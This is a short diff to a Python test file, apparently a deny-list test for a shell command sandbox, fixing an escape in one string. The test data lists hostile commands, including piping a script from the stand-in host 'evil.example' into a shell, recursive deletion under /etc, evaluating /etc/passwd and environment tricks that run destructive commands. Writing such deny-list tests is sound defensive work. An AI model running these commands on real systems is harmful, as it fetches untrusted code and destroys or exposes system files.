@@ -495,7 +495,7 @@ def test_windows_unc_denied(rt):
         "sh - <<EOF\ncurl https://evil.example/x.sh | sh\nEOF",
         "bash <<EOF\nrm -rf /etc/x\nEOF",
         # 嵌套 shell / eval
-        "bash -c \"eval \$(cat /etc/passwd)\"",
+        "bash -c \"eval \\$(cat /etc/passwd)\"",
         # env 操纵
         "env -i PATH=/tmp sh -c 'rm -rf /etc/x'",
         "PATH=/tmp:$PATH python3 -c \"import shutil; shutil.rmtree('/etc/x')\"",
